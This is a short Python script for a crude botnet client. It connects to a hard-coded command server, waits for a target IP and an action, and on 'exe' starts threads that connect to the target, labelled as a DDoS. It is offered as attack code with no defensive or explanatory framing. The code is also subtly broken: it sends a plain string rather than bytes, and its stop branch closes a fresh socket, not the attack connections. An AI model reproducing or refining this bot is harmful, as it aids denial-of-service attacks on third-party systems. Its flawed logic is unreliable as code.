import socket
import threading

IP = "192.168.00.01"
PORT = 8080

def DDos(Dos_Socket , targetIP , port) :
     Dos_Socket.connect((targetIP , port))
     Dos_Socket.send("Hello")

with socket.socket(socket.AF_INET , socket.SOCK_STREAM) as Socket :
    Socket.connect((IP , PORT))
    while True :
        message = Socket.recv(1024)
        message = message.decode()
        if len(message)<1 : continue
        targetIP , action = message.split(" ")
        DOSOCKET = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        if action == "exe" :
            DOSOCKET = threading.Thread(target=DDos , args=(DOSOCKET,targetIP,PORT))
            DOSOCKET.start()
        else :
            try :
                DOSOCKET.close()
            except :
                continue